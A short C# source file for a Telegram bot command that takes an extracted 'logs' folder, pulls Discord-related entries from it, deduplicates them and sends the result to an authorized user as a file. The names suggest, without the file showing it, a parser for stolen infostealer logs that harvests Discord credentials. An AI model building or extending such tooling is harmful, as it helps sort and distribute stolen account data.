using Core.Parsers.Services;
using TelegramBot.Extensions;
using TelegramBot.Models;
using TelegramBot.Services;
using TL;
using WTelegram;

namespace TelegramBot.Commands.Services;

public class DiscordServiceCommand(Client client, DataService data) : ICommand, ICallbackCommand
{
    public bool AuthorizedOnly { get; } = true;

    public Task Invoke(UpdateNewMessage update, User user) =>
        client.SendAvailableLogs(user, "Discord", data);

    public async Task Invoke(UpdateBotCallbackQuery update, User user)
    {
        if (await client.SendCallbackAvailableLogsOrGetPath(user, data, update.msg_id, update.data) is not { } logsname)
            return;

        var logspath = data.GetExtractedPath(logsname);
        var filepath = await data.SaveAsync(logsname, logspath.DiscordByLogs().Distinct(), "Discord");

        await data.SendFileAsync(user, filepath);
    }
}